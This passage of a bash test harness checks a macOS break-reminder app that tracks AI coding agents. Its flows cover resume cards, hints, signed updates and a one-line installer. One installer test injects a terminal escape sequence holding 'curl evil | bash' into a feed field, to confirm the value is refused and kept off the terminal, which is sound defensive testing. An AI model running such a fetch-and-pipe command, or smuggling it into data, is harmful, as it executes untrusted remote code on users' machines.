  emit_json agentActivity claude-code '{"session_id":"s1","cwd":"/work/alpha","hook_event_name":"PostToolUse","tool_name":"Write"}'
  emit_json agentActivity claude-code '{"session_id":"s1","cwd":"/work/alpha","hook_event_name":"PostToolUse","tool_name":"Bash","tool_input":{"command":"swift test"}}'
  dbg advance 170
  dbg action start eyes
  emit_json agentFinished claude-code "$CLAUDE_STOP"
  expect "no message kept" "$(q '.sessions[0].report.message')" "null"
  expect "no prompt kept" "$(q '.sessions[0].title')" "null"
  dbg advance 21
  expect "same strong line" "$(q '.cards[0].text')" "Claude finished · ran 3 min"
  expect "counts instead of the message" "$(q '.cards[0].detail')" "2 edits · 1 command"
  dbg action dismiss all
  dbg settings '{"storePromptSnippets": true}'
  # A usage limit during a break, in plain words.
  emit_json agentStarted claude-code "$CLAUDE_PROMPT"
  dbg action start eyes
  emit_json agentFinished claude-code '{"session_id":"s1","cwd":"/work/alpha","hook_event_name":"StopFailure","error":"rate_limit","last_assistant_message":"API Error: 429"}' --detail error
  dbg advance 21
  expect "a failure says why" "$(q '.cards[0].text')" "Claude hit the usage limit"
  expect "with the prompt it stopped on" "$(q '.cards[0].detail')" "fix the login redirect"
  if bp debug log | grep -q "214 tests"; then fail "the trace never holds the agent's message"; else pass "the trace never holds the agent's message"; fi
  end_flow
}

flow_resume_background() {
  flow "a stop with background tasks stays working" rb
  emit_json agentStarted claude-code "$CLAUDE_PROMPT"
  dbg action start eyes
  emit_json agentFinished claude-code '{"session_id":"s1","cwd":"/work/alpha","hook_event_name":"Stop","last_assistant_message":"The tests are running in the background.","background_tasks":[{"id":"b1","type":"shell","status":"running","description":"swift test"}],"session_crons":[]}'
  expect "still working" "$(q '.sessions[0].state')" "working"
  expect_match "the chip still says working" "$(q .break.chip)" "still working"
  dbg advance 21
  expect "no resume card for a run that is still going" "$(q '.cards | length')" "0"
  emit_json agentFinished claude-code "$CLAUDE_STOP"
  expect "the real stop finishes the run" "$(q '.sessions[0].state')" "idle"
  expect "with its message" "$(q '.sessions[0].report.message')" "Fixed the redirect; all 214 tests pass."
  end_flow
}

flow_resume_needs_you_goes() {
  flow "a needs-you card disappears when the agent moves on" rn
  emit_json agentStarted claude-code "$CLAUDE_PROMPT"
  emit agentStarted --source codex --session c1 --cwd /work/beta
  dbg action start move
  emit_json agentNeedsUser claude-code '{"session_id":"s1","cwd":"/work/alpha","hook_event_name":"PermissionRequest","tool_name":"Bash","tool_input":{"command":"npm install --save-dev vitest"}}'
  emit_json agentFinished codex '{"session_id":"c1","cwd":"/work/beta","hook_event_name":"Stop","last_assistant_message":"Added retries to the webhook client."}'
  dbg advance 4
  dbg action skip
  expect "needs-you first" "$(q '.cards[0].text')" "Claude needs you"
  expect "rows: needs you, then finished" "$(q '.cards[0].rows | join(", ")')" "Claude needs you, Codex <1 min"
  dbg advance 15
  expect "it stays while Claude waits" "$(q '.cards | length')" "1"
  # Approved in the terminal: Claude works again, so its row goes; the finished row stays and hides itself.
  emit_json agentActivity claude-code '{"session_id":"s1","cwd":"/work/alpha","hook_event_name":"PostToolUse","tool_name":"Bash"}'
  expect "only the finished row is left" "$(q '.cards[0].text')" "Codex finished · ran <1 min"
  dbg advance 11
  expect "and it hides itself" "$(q '.cards | length')" "0"
  # One session asking alone: the card says what it wants, and goes when the agent resumes.
  dbg action start eyes
  emit_json agentNeedsUser claude-code '{"session_id":"s1","cwd":"/work/alpha","hook_event_name":"PermissionRequest","tool_name":"Bash","tool_input":{"command":"npm install"}}'
  dbg advance 21
  expect "what it wants" "$(q '.cards[0].detail')" "Wants to run npm install"
  emit_json agentFinished claude-code "$CLAUDE_STOP"
  expect "the run ended: the card goes" "$(q '.cards | length')" "0"
  # Snippets off: the kind of request, not the command; and a session that ends takes its card.
  dbg settings '{"storePromptSnippets": false}'
  emit_json agentStarted claude-code "$CLAUDE_PROMPT"
  dbg action start eyes
  emit_json agentNeedsUser claude-code '{"session_id":"s1","cwd":"/work/alpha","hook_event_name":"PermissionRequest","tool_name":"Bash","tool_input":{"command":"npm install"}}'
  dbg advance 21
  expect "no command shown" "$(q '.cards[0].detail')" "Wants to run a command"
  emit sessionEnded --source claude-code --session s1
  expect "the session ended: the card goes" "$(q '.cards | length')" "0"
  end_flow
}

flow_resume_commands() {
  flow "a long shell command that fails during a break is on the card" rc
  dbg timers 1250 3050
  emit commandStarted --source shell --session 4242 --cwd /work/alpha --title "swift test"
  dbg advance 21
  expect "a long command offers a break" "$(q .nudge.opportunity)" "longCommand"
  dbg action accept
  dbg advance 60
  emit commandFinished --source shell --session 4242 --cwd /work/alpha --title swift --exit-code 1 --duration-ms 81000
  dbg advance 61
  expect "the stretch ended" "$(q '.history[-1] | "\(.kind) \(.outcome)"')" "move completed"
  expect "the command's outcome" "$(q '.cards[0].text')" "swift failed after 1 min"
  expect "and its folder" "$(q '.cards[0].folder')" "alpha"
  dbg action dismiss all
  # Interrupted (Control-C) or short commands stay off the card.
  dbg action start eyes
  emit commandStarted --source shell --session 5 --cwd /work/alpha --title make
  emit commandFinished --source shell --session 5 --cwd /work/alpha --title make --exit-code 130 --duration-ms 30000
  emit commandStarted --source shell --session 6 --cwd /work/alpha --title cargo
  emit commandFinished --source shell --session 6 --cwd /work/alpha --title cargo --exit-code 0 --duration-ms 5000
  dbg advance 21
  expect "nothing to report" "$(q '.cards | length')" "0"
  # Away from the keyboard: a long build that succeeds is on the card when you come back.
  emit commandStarted --source shell --session 7 --cwd /work/beta --title "cargo build --release"
  dbg idle 240
  emit commandFinished --source shell --session 7 --cwd /work/beta --title cargo --exit-code 0 --duration-ms 241000
  dbg input pointer
  expect "finished while away" "$(q '[.cards[] | select(.kind == "resume") | .text] | first')" "cargo finished in 4 min"
  end_flow
}

flow_totals() {
  flow "the popover's all-time totals grow with each stretch and walk" totals
  dbg jump 12:00
  T='.totals | "\(.period) | \(.moving) moving, \(.stretches) stretches, \(.eyeRests) eye rests | \(.line) | new: \(.lineIsNew)"'
  expect "nothing recorded yet" "$(q "$T")" "Today | 0 min moving, 0 stretches, 0 eye rests | null | new: false"
  dbg action start move; dbg advance 121
  expect "the first stretch: no line yet" "$(q "$T")" "Today | 2 min moving, 1 stretches, 0 eye rests | null | new: false"
  dbg action start move; dbg advance 121
  expect "the second stretch reaches an example, new" "$(q "$T")" \
    "Today | 4 min moving, 2 stretches, 0 eye rests | That's like dancing to a whole song. | new: true"
  dbg action start eyes; dbg advance 21
  dbg action start breathe; dbg advance 61
  expect "an eye rest counts; a breather adds no moving; the example stays new" "$(q "$T")" \
    "Today | 4 min moving, 2 stretches, 1 eye rests | That's like dancing to a whole song. | new: true"
  dbg action start move; dbg advance 4; dbg action skip
  expect "a stretch skipped at once still counts, with its 4 s" "$(q "$T") | $(q .totals.movingSeconds)" \
    "Today | 4 min moving, 3 stretches, 1 eye rests | That's like dancing to a whole song. | new: false | 244"
  dbg action start walk; dbg advance 360; dbg action finish imBack
  expect "a 6-min walk moves the figure and changes the line" "$(q "$T")" \
    "Today | 10 min moving, 3 stretches, 1 eye rests | That's like the warm-up before a run. | new: true"
  dbg action start move; dbg advance 121
  expect "a stretch that reaches nothing new: the example is no longer new" "$(q '.totals | "\(.moving) \(.lineIsNew)"')" "12 min false"
  launch
  expect "after a relaunch the totals are read back from history" "$(q '.totals | "\(.moving) \(.stretches) \(.walks) \(.eyeRests) \(.lineIsNew)"')" \
    "12 min 4 1 1 false"
  dbg action delete-all-data
  expect "Delete all data resets them" "$(q "$T")" "Today | 0 min moving, 0 stretches, 0 eye rests | null | new: false"
  end_flow
}

flow_updates() {
  flow "update check: daily, at quiet moments, Later waits three days" updates
  local CURRENT FEED U CARD
  CURRENT="$(bp --version | awk '{print $NF}')"
  FEED="$BREAKPOINT_HOME/feed.json"
  echo "not a real archive" > "$BREAKPOINT_HOME/Breakpoint-9.9.9.zip"
  scripts/make-update-feed.sh 9.9.9 "Breaks now wait for every agent." "$BREAKPOINT_HOME/Breakpoint-9.9.9.zip" > "$FEED"
  U='.update | "\(.phase) \(.fetches) \(.latest)"'
  CARD='[.cards[] | select(.kind == "update") | .text] | join(",")'
  expect "nothing is checked at launch" "$(q "$U")" "idle 0 null"
  dbg update-feed "$FEED"
  dbg action start walk
  dbg advance 200
  expect "no check during a break, even after the first two minutes" "$(q "$U")" "idle 0 null"
  dbg action finish imBack
  dbg advance 1
  expect "the check runs once the break is over" "$(q "$U")" "available 1 9.9.9"
  dbg advance 1
  expect "the prompt says what is new in one line" "$(q "$CARD")" "Breakpoint 9.9.9 is ready — Breaks now wait for every agent. [Later | Download page]"
  expect_log "the trace notes the automatic check" "update check \(automatic\)"
  dbg action dismiss update
  expect "Later closes it and puts that version off" "$(q '"\(.update.postponedVersion) \(.cards | length)"')" "9.9.9 0"
  dbg advance 60
  expect "it does not come back soon" "$(q "$CARD")" ""
  dbg jump +86400
  dbg advance 1
  expect "a day later the daily check runs again, but Later still holds" "$(q "$U") $(q "$CARD")" "available 2 9.9.9 "
  dbg call mic
  dbg jump +172800
  dbg advance 2
  expect "no check and no prompt during a call" "$(q "$U") $(q "$CARD")" "available 2 9.9.9 "
  dbg call none
  dbg input key
  dbg advance 2
  expect "after the call the check runs, but not while you type" "$(q "$U") $(q "$CARD")" "available 3 9.9.9 "
  dbg advance 30
  expect "half a minute after the last key, three days after Later, it asks again" "$(q "$CARD")" \
    "Breakpoint 9.9.9 is ready — Breaks now wait for every agent. [Later | Download page]"
  dbg action open-update
  expect "Download page closes the prompt" "$(q "$CARD")" ""
  expect_log "and opens the release page, inside the repository" "opened https://github.com/estrindavid/breakpoint/releases/tag/v9.9.9"
  dbg settings '{"checkForUpdates": false}'
  dbg jump +345600
  dbg advance 2
  expect "with automatic checks off: no check, no prompt, and About still knows" "$(q "$U") $(q "$CARD")" "available 3 9.9.9 "
  scripts/make-update-feed.sh "$CURRENT" "This version." "$BREAKPOINT_HOME/Breakpoint-9.9.9.zip" > "$FEED"
  dbg action check-updates
  expect "Check now works with automatic checks off, and finds this version up to date" "$(q "$U")" "upToDate 4 $CURRENT"
  dbg update-feed fail
  dbg action check-updates
  expect "a failed check says so, quietly" "$(q '"\(.update.phase) \(.update.lastAttemptFailed) \(.cards | length)"')" "failed true 0"
  printf '{"version": "9.9.10", "page": "https://example.com/breakpoint"}' > "$FEED"
  dbg update-feed "$FEED"
  dbg action check-updates
  expect "a feed that points outside the repository is refused" "$(q "$U")" "failed 6 $CURRENT"
  launch
  expect "after a relaunch: what was learned stays, and nothing is fetched early" \
    "$(q '"\(.update.phase) \(.update.fetches) \(.update.latest) \(.settings.checkForUpdates)"')" "failed 0 $CURRENT false"
  dbg settings '{"checkForUpdates": true}'
  dbg advance 125
  expect "the harness never reaches the network: with no feed set, the check fails" "$(q "$U")" "failed 1 $CURRENT"
  expect_log "why it failed" "no feed in the debug harness"
  end_flow
}

# fake_app FOLDER VERSION [IDENTIFIER]: a stand-in Breakpoint.app (Info.plist and an executable: a
# script that exits 0, or a copy of $FAKE_EXECUTABLE when set, for the installer's processor check).
fake_app() {
  local app="$1/Breakpoint.app"
  mkdir -p "$app/Contents/MacOS"
  cat > "$app/Contents/Info.plist" <<PLIST
<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0"><dict>
<key>CFBundleIdentifier</key><string>${3:-com.breakpointapp.Breakpoint}</string>
<key>CFBundleShortVersionString</key><string>$2</string>
<key>CFBundleExecutable</key><string>Breakpoint</string>
</dict></plist>
PLIST
  if [[ -n "${FAKE_EXECUTABLE:-}" ]]; then
    cp "$FAKE_EXECUTABLE" "$app/Contents/MacOS/Breakpoint"
  else
    printf '#!/bin/sh\nexit 0\n' > "$app/Contents/MacOS/Breakpoint"
  fi
  chmod +x "$app/Contents/MacOS/Breakpoint"
}
app_version() { /usr/libexec/PlistBuddy -c 'Print :CFBundleShortVersionString' "$1/Contents/Info.plist" 2>/dev/null; }
# signing_tool: scripts/update-signing.swift, compiled once per run.
signing_tool() {
  [[ -x "$ROOT/update-signing" ]] || swiftc -O scripts/update-signing.swift -o "$ROOT/update-signing" 2>/dev/null
  echo "$ROOT/update-signing"
}
# release_dir DIR VERSION NOTES [KEY]: a release folder (zip, feed) for a stand-in app, signed with KEY
# (a throwaway private key) when given.
release_dir() {
  local dir="$1" src="$1/src-$2"
  mkdir -p "$dir"; fake_app "$src" "$2"
  ditto -c -k --norsrc --noextattr --keepParent "$src/Breakpoint.app" "$dir/Breakpoint-$2.zip"
  local sig=""
  [[ -n "${4:-}" ]] && sig="$(UPDATE_SIGNING_KEY="$4" "$(signing_tool)" sign "$2" "$dir/Breakpoint-$2.zip")"
  scripts/make-update-feed.sh "$2" "$3" "$dir/Breakpoint-$2.zip" "$sig" > "$dir/update-feed.json"
}

flow_update_install() {
  flow "Update: verified with the release key, swapped in place, reopened; anything else refused" upinstall
  local CURRENT SIGN KEY PUB OTHER APPS U CARD STAGED
  CURRENT="$(bp --version | awk '{print $NF}')"
  SIGN="$(signing_tool)"
  # Throwaway keys for this run only: generated here, never stored outside the temporary home.
  KEY="$("$SIGN" keygen "$BREAKPOINT_HOME/release.pub")"; PUB="$(cat "$BREAKPOINT_HOME/release.pub")"
  OTHER="$("$SIGN" keygen "$BREAKPOINT_HOME/other.pub")"
  expect "the signing script and the app build the same signed message" \
    "$(echo data > "$BREAKPOINT_HOME/d"; "$SIGN" verify 1.0.0 "$BREAKPOINT_HOME/d" "$(UPDATE_SIGNING_KEY="$KEY" "$SIGN" sign 1.0.0 "$BREAKPOINT_HOME/d")" "$PUB" && echo yes)" "yes"
  APPS="$BREAKPOINT_HOME/Applications"; fake_app "$APPS" "$CURRENT"
  U='.update | "\(.phase) \(.available) \(.canInstall)"'
  CARD='[.cards[] | select(.kind == "update") | .text] | join(",")'
  dbg update-location "$APPS/Breakpoint.app"

  release_dir "$BREAKPOINT_HOME/r1" 9.9.8 "Signed with another key." "$OTHER"
  dbg update-feed "$BREAKPOINT_HOME/r1/update-feed.json"
  dbg action check-updates
  expect "without a release key in this copy it can only announce" "$(q "$U") $(q .update.blocker)" \
    "available 9.9.8 false This copy has no release key, so it can tell you about new versions but not install them."
  dbg advance 1
  expect_match "so the prompt offers the download page" "$(q "$CARD")" "\[Later \| Download page\]$"
  dbg action dismiss update
  dbg update-key "$PUB"
  expect "with the key, Update installs in place" "$(q "$U")" "available 9.9.8 true"
  dbg action install-update
  expect "a signature from another key: refused before unpacking, the app untouched" \
    "$(q '.update | "\(.phase) \(.detail)"') | $(app_version "$APPS/Breakpoint.app") | $(ls -A "$APPS" | tr '\n' ' ')" \
    "installFailed The download didn't match its signature, so Breakpoint didn't install it. | $CURRENT | Breakpoint.app "
  expect "that version is not offered for install again" "$(q '"\(.update.installFailedVersion) \(.update.canInstall)"')" "9.9.8 false"

  release_dir "$BREAKPOINT_HOME/r2" 9.9.9 "Breaks now wait for every agent." "$KEY"
  printf 'x' >> "$BREAKPOINT_HOME/r2/Breakpoint-9.9.9.zip"
  dbg update-feed "$BREAKPOINT_HOME/r2/update-feed.json"
  dbg action check-updates
  dbg action install-update
  expect "a changed archive: refused" "$(q '.update | "\(.phase) \(.detail)"') | $(app_version "$APPS/Breakpoint.app")" \
    "installFailed The download didn't match its signature, so Breakpoint didn't install it. | $CURRENT"

  release_dir "$BREAKPOINT_HOME/r3" 9.9.10 "Breaks now wait for every agent." "$KEY"
  dbg update-feed "$BREAKPOINT_HOME/r3/update-feed.json"
  dbg action check-updates
  dbg action start move
  dbg action install-update
  expect "never during a break: it waits, and Update stays on offer" \
    "$(q '.update | "\(.phase) \(.canInstall)"') | $(app_version "$APPS/Breakpoint.app")" "available true | $CURRENT"
  expect_log "why it waited" "update install stopped: breakInProgress"
  dbg action skip; dbg advance 4; dbg action skip
  dbg action install-update
  STAGED="$(ls -d "$APPS"/.Breakpoint-update-*/Breakpoint.app 2>/dev/null | head -1)"
  expect "after the break: verified, unpacked next to the app, swapped" \
    "$(app_version "$APPS/Breakpoint.app") | old copy kept: $(app_version "$STAGED")" "9.9.10 | old copy kept: $CURRENT"
  expect "and it hands over to the relaunch helper (not in the harness)" "$(q '.update | "\(.phase) \(.detail)"')" "installing reopening"
  expect_log "the helper runs from the old copy" "reopen: .*\.Breakpoint-update-.*/Breakpoint.app/Contents/Helpers/breakpoint update-relaunch --pid"
  expect "pending-update.json records the swap" \
    "$(jq -r '"\(.fromVersion) → \(.toVersion)"' "$BREAKPOINT_HOME/Library/Application Support/Breakpoint/pending-update.json")" \
    "$CURRENT → 9.9.10"
  expect "downloads: one per Update click that got past the checks before it" "$(q .update.downloads)" "3"
  expect "nothing was marked quarantined" "$(xattr -lr "$APPS" | grep -c com.apple.quarantine)" "0"
  end_flow
}

flow_update_reopened() {
  flow "after an in-place update: the new copy confirms, or the old one says it is back" reopened
  local CURRENT PENDING SWAP
  CURRENT="$(bp --version | awk '{print $NF}')"
  PENDING="$BREAKPOINT_HOME/Library/Application Support/Breakpoint/pending-update.json"
  SWAP='"swapped": {"installed": "file:///nowhere/Breakpoint.app", "backup": "file:///nowhere/old.app", "stagingDirectory": "file:///nowhere/s"}'
  stop_app
  echo "{\"fromVersion\": \"0.0.1\", \"toVersion\": \"$CURRENT\", $SWAP, \"startedAt\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"}" > "$PENDING"
  launch
  expect "the new copy confirms it started" "$(jq -r '"\(.confirmedAt != null) \(.newPID != null)"' "$PENDING")" "true true"
  expect "and says so, once" "$(q '[.cards[] | select(.kind == "toast") | .text] | join(",")')" "Breakpoint is now $CURRENT"
  stop_app
  echo "{\"fromVersion\": \"$CURRENT\", \"toVersion\": \"9.9.9\", $SWAP, \"startedAt\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\", \"failedAt\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"}" > "$PENDING"
  launch
  expect "a copy that was put back says what happened" "$(q '[.cards[] | select(.kind == "toast") | .text] | join(",")')" \
    "The update to 9.9.9 didn't start, so Breakpoint is back on $CURRENT"
  expect "and does not try that version by itself again" "$(q .update.installFailedVersion) $([[ -e "$PENDING" ]] && echo kept || echo removed)" "9.9.9 removed"
  end_flow
}

flow_update_automatic() {
  flow "Install updates automatically: at a quiet moment, without a prompt" upauto
  local CURRENT SIGN KEY APPS
  CURRENT="$(bp --version | awk '{print $NF}')"
  SIGN="$(signing_tool)"
  KEY="$("$SIGN" keygen "$BREAKPOINT_HOME/release.pub")"
  APPS="$BREAKPOINT_HOME/Applications"; fake_app "$APPS" "$CURRENT"
  release_dir "$BREAKPOINT_HOME/r" 9.9.9 "Quietly." "$KEY"
  dbg update-location "$APPS/Breakpoint.app"; dbg update-key "$(cat "$BREAKPOINT_HOME/release.pub")"
  dbg update-feed "$BREAKPOINT_HOME/r/update-feed.json"
  dbg settings '{"installUpdatesAutomatically": true}'
  dbg call mic
  dbg advance 125
  expect "not during a call" "$(app_version "$APPS/Breakpoint.app") $(q .update.downloads)" "$CURRENT 0"
  dbg call none
  dbg advance 3
  expect "then: checked, installed, no prompt" \
    "$(app_version "$APPS/Breakpoint.app") $(q '[.cards[] | select(.kind == "update")] | length') $(q .update.detail)" "9.9.9 0 reopening"
  end_flow
}

flow_install_script() {
  flow "the one-line installer: checks the download, installs, opens nothing" installer
  local REL DEST OUT
  REL="$BREAKPOINT_HOME/release"; DEST="$BREAKPOINT_HOME/Applications"
  # A real program (Apple silicon and Intel) as the executable, so the processor check passes.
  FAKE_EXECUTABLE=/usr/bin/true release_dir "$REL" 9.9.9 "Installer test."
  run_installer() {
    LC_ALL=en_US.UTF-8 BREAKPOINT_INSTALL_BASE="file://${2:-$REL}" BREAKPOINT_INSTALL_DIR="${1:-$DEST}" BREAKPOINT_INSTALL_ALLOW_RUNNING=1 \
      bash scripts/install.sh 2>&1
  }
  OUT="$(run_installer)"
  expect_match "installs and says where" "$OUT" "Installed Breakpoint 9.9.9 in .*/Applications/Breakpoint.app"
  expect "the app is there, not quarantined" "$(app_version "$DEST/Breakpoint.app") $(xattr -lr "$DEST" | grep -c com.apple.quarantine)" "9.9.9 0"
  fake_app "$DEST" 0.0.1
  expect_match "replaces an older copy" "$(run_installer)" "Updated Breakpoint 0.0.1 → 9.9.9"
  printf 'x' >> "$REL/Breakpoint-9.9.9.zip"
  OUT="$(run_installer)"
  expect_match "refuses a download that does not match" "$OUT" "not installed: the download has the wrong size"
  expect "and leaves the installed copy alone" "$(app_version "$DEST/Breakpoint.app")" "9.9.9"
  release_dir "$BREAKPOINT_HOME/script-only" 9.9.8 "No code for this processor."
  expect_match "refuses an app with no code for this Mac's processor" \
    "$(run_installer "$BREAKPOINT_HOME/Other" "$BREAKPOINT_HOME/script-only")" "not installed: Breakpoint 9.9.8 does not run on this Mac's processor"
  expect "and installs nothing" "$(ls "$BREAKPOINT_HOME/Other" 2> /dev/null | wc -l | tr -d ' ')" "0"
  # curl … | bash: a download cut short, at any line or in the middle of one, runs nothing.
  REL="$BREAKPOINT_HOME/release2"
  FAKE_EXECUTABLE=/usr/bin/true release_dir "$REL" 9.9.10 "Installer test."
  local CUT RAN=""
  run_cut() {  # run_cut -n LINES | -c BYTES: the first part of the script only
    head "$1" "$2" scripts/install.sh > "$ROOT/cut.sh"
    OUT="$(LC_ALL=en_US.UTF-8 BREAKPOINT_INSTALL_BASE="file://$REL" BREAKPOINT_INSTALL_DIR="$DEST" BREAKPOINT_INSTALL_ALLOW_RUNNING=1 \
      bash < "$ROOT/cut.sh" 2>&1)"
    [[ "$OUT" == *Fetching* || "$(app_version "$DEST/Breakpoint.app")" != 9.9.9 ]] && RAN="$RAN $1$2"
  }
  for CUT in $(seq 1 $(($(wc -l < scripts/install.sh) - 1))); do run_cut -n "$CUT"; done
  for CUT in $(seq 40 53 $(($(wc -c < scripts/install.sh) - 1))); do run_cut -c "$CUT"; done
  expect "a script cut short anywhere runs nothing" "${RAN:-nothing ran}" "nothing ran"
  expect_match "the whole script still installs" "$(run_installer)" "Updated Breakpoint 9.9.9 → 9.9.10"
  # Feed text that is not what it should be is refused, and never printed to the terminal.
  jq '.minimumSystemVersion = "99.0\u001b]0;Run this to fix: curl evil | bash\u0007"' "$REL/update-feed.json" > "$ROOT/feed.json"
  mv "$ROOT/feed.json" "$REL/update-feed.json"
  OUT="$(run_installer)"
  expect_match "a feed with a strange macOS version is refused" "$OUT" "not installed: the release information names no macOS version"
  expect "and its text never reaches the terminal" "$([[ "$OUT" == *$'\e'* || "$OUT" == *evil* ]] && echo printed || echo kept out)" "kept out"
  end_flow
}

# The whole tour, then real use: only what the tour could not teach comes as a hint (SPEC §3.12).
flow_hints_after_tour() {
  flow "hints after the tour" hints-tour 0
  dbg jump 12:00
  dbg action complete-onboarding
  sleep 0.3
  for step in next next; do dbg tour $step; done
  dbg action accept
  dbg advance 16
  dbg action dismiss resume
  for part in 1 2 3 4; do dbg tour next; done
  dbg tour next
  expect "the tour finished" "$(q .settings.tourStatus)" "finished"
  # A stretch offer: the tour had them press Start, so no hint.
  dbg timers 0 3050
  emit agentStarted --source claude-code --session s1 --cwd /work/alpha
  expect "a real stretch is offered" "$(q .nudge.kind)" "move"
  expect "no nudge hint: the tour taught it" "$(q .nudge.hint)" "null"
  dbg action accept
  expect "no break hint: the tour taught it" "$(q .break.hint)" "null"
  emit agentFinished --source claude-code --session s1
  dbg advance 121
  expect_match "a resume card that goes by itself" "$(q '.cards[0].text')" "^Claude finished"
  expect "no resume hint: the tour taught it" "$(q '.cards[0].hint')" "null"
  dbg action dismiss all
  # What the tour could not teach: an eye rest that starts by itself…
  dbg advance 601
  dbg timers 1250 0
  emit agentStarted --source claude-code --session s1
  expect "an eye rest counting down to start by itself" "$(q .nudge.phase)" "autoStartCard"
  expect "carries its hint" "$(q .nudge.hint)" "It starts by itself. Press any key to keep working."
  dbg input key
  expect "a key keeps you working: an ordinary offer" "$(q .nudge.phase)" "offer"
  expect "and the line goes with the countdown" "$(q .nudge.hint)" "null"
  dbg action decline
  # …a resume card that waits because an agent needs you…
  dbg action start breathe
  emit agentNeedsUser --source claude-code --session s1 --detail permission_prompt
  dbg advance 4
  dbg action skip
  expect "a needs-you card" "$(q '.cards[0].text')" "Claude needs you"
  expect "carries its hint" "$(q '.cards[0].hint')" "It stays until you press ⌃⌥⌘. or click it."
  dbg action dismiss all
  # …Option-click on the mark…
  dbg action activate
  expect "the popover carries its hint" "$(q .popover.hint)" "Option-click the mark to see why no break yet."
  dbg action close-popover
  dbg action activate
  expect "once" "$(q .popover.hint)" "null"
  dbg action close-popover
  # …and a call.
  dbg call camera
  expect "the first call pause shows its toast even with nothing due" "$(q '[.cards[] | select(.kind == "toast")][0].text')" "Breaks paused: camera is on"
  expect "with its hint" "$(q '[.cards[] | select(.kind == "toast")][0].hint')" "Breaks come back by themselves after the call."
  expect "every hint is spent" "$(q '.hints.pending | length')" "0"
  expect_log "the trace names what the tour taught" "taught by the tour: nudge"
  end_flow
}

# The tour declined: every surface carries its hint the first time, once (SPEC §3.12).
flow_hints_after_skipped_tour() {
  flow "hints after a skipped tour" hints-skip 0
  dbg jump 12:00
  dbg action complete-onboarding
  sleep 0.3
  dbg tour skip
  expect "Not now on the offer" "$(q .settings.tourStatus)" "declined"
  sleep 0.2
  expect "the popover opens once, as before the tour existed" "$(q .popover.open)" "true"
  expect "with its hint" "$(q .popover.hint)" "Option-click the mark to see why no break yet."
  dbg action close-popover
  dbg timers 0 3050
  emit agentStarted --source claude-code --session s1 --cwd /work/alpha
  expect "the first nudge carries its hint" "$(q .nudge.hint)" "Start, or carry on: it asks again later."
  dbg action accept
  expect "the first break carries its hint" "$(q .break.hint)" "The chip above follows Claude and turns amber if Claude needs you."
  emit agentFinished --source claude-code --session s1
  dbg advance 121
  expect "the first resume card carries its hint" "$(q '.cards[0].hint')" "It sums up your time away, then goes by itself."
  dbg action dismiss all
  dbg call camera
  expect "the first call pause carries its hint" "$(q '[.cards[] | select(.kind == "toast")][0].hint')" "Breaks come back by themselves after the call."
  dbg call none
  dbg action dismiss all
  # The second time round: no hints anywhere.
  dbg advance 601
  dbg timers 1250 0
  emit agentStarted --source claude-code --session s1
  expect "an eye rest that starts by itself" "$(q .nudge.phase)" "autoStartCard"
  expect "no hint: the nudge already carried one" "$(q .nudge.hint)" "null"
  dbg action decline
  dbg action start eyes
  expect "no hint on the second break" "$(q .break.hint)" "null"
  dbg advance 21
  dbg action activate
  expect "no hint on the second popover" "$(q .popover.hint)" "null"
  expect "nothing is pending" "$(q '.hints.pending | length')" "0"
  launch
  dbg action activate
  expect "nor after a relaunch" "$(q .popover.hint)" "null"
  end_flow
}

# Someone updating from a version without the tour or hints: neither, until they ask (SPEC §3.12).
# The popover closes when you leave it, and never hangs on by itself (SPEC §3.8). The real status
# item reports clicks, Esc, other apps, Spaces, displays and the menu bar sliding away; here the
# harness reports them the same way (`debug popover`), and the app's own policy decides.
flow_popover() {
  flow "the popover closes when you leave it" popover
  dbg settings '{"showHints": true}'
  dbg action activate
  expect "the mark opens the popover" "$(q .popover.open)" "true"
  expect "the first time with its hint" "$(q .popover.hint)" "Option-click the mark to see why no break yet."
  dbg popover menu-bar-hidden
  expect "the hint keeps it open when the menu bar slides away" "$(q .popover.open)" "true"
  expect_log "and the trace says so" "popover stays open after the menu bar sliding away"
  dbg popover space
  expect "a Space switch caused by opening it does not close it" "$(q .popover.open)" "true"
  dbg advance 1
  dbg popover click-outside
  expect "a click outside closes it" "$(q .popover.open)" "false"
  expect "named in debug state" "$(q .popover.closedBy)" "clickOutside"
  expect_log "and in the trace" "popover closing: a click outside it"
  expect "its hint goes with it, once" "$(q .popover.hint)" "null"

  dbg action activate
  expect "opening it again forgets what closed it last" "$(q .popover.closedBy)" "null"
  dbg popover menu-bar-hidden pointer-on
  expect "the menu bar sliding away while the pointer is on it: it stays" "$(q .popover.open)" "true"
  dbg popover menu-bar-hidden
  expect "the pointer leaving it while the menu bar is away: it goes" "$(q .popover.open)" "false"
  expect "closed by the menu bar sliding away" "$(q .popover.closedBy)" "menuBarHidden"

  for pair in other-app:otherAppActive space:spaceChanged display:displayChanged; do
    dbg action activate
    dbg advance 1
    dbg popover "${pair%%:*}"
    expect "${pair%%:*}: closed" "$(q .popover.open) $(q .popover.closedBy)" "false ${pair##*:}"
  done
  dbg action activate
  dbg popover esc
  expect "Esc closes it at once" "$(q .popover.open) $(q .popover.closedBy)" "false escape"

  dbg popover click-outside
  expect "a click with the popover closed changes nothing" "$(q .popover.open) $(q .popover.closedBy)" "false escape"
  dbg action activate
  dbg action close-popover
  expect "the mark (or a command) closes it as before, no cause recorded" "$(q .popover.open) $(q .popover.closedBy)" "false null"
  expect "it never reopened by itself" "$(bp debug log | grep -c 'popover shown')" "7"
  end_flow
}

flow_hints_existing_user() {
  flow "an existing user after an update: no tour, no hints" hints-old
  dbg jump 12:00
  expect "Show hints reads off" "$(q .hints.show)" "false"
  expect "no tour" "$(q .tour)" "null"
  dbg timers 0 3050
  emit agentStarted --source claude-code --session s1
  expect "no nudge hint" "$(q .nudge.hint)" "null"
  dbg action accept
  expect "no break hint" "$(q .break.hint)" "null"
  dbg advance 121
  dbg action activate
  expect "no popover hint" "$(q .popover.hint)" "null"
  dbg action close-popover
  expect "no hint line in the trace" "$(bp debug log | grep -c 'hint shown')" "0"
  # Settings → General → Show hints: asking for them.
  dbg settings '{"showHints": true}'
  dbg action activate
  expect "turned on, the next surface carries its hint" "$(q .popover.hint)" "Option-click the mark to see why no break yet."
  dbg action close-popover
  dbg tour start
  expect "Take the tour still works" "$(q .tour.step)" "mark"
  dbg tour skip
  end_flow
}

flow_status_line() {
  flow "status line for prompts and status bars" status_line
  line() { bp status --line; }
  dbg jump 09:30
  expect "idle: the next break" "$(line)" "eye rest in 20 min"
